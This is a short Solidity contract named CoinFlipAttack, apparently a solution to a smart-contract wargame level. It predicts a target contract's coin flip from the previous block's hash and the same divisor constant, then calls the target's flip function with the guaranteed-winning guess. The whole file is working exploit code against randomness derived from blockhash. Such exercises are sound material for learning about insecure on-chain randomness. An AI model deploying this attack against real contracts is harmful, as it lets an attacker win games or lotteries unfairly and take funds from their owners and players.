// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface CoinFlip {
    function flip(bool _guess)  external returns (bool);
    function consecutiveWins() external view returns (uint);
}

contract CoinFlipAttack {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {}

function attack(address target) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    CoinFlip instance = CoinFlip(target);
    return instance.flip(side);
  }
}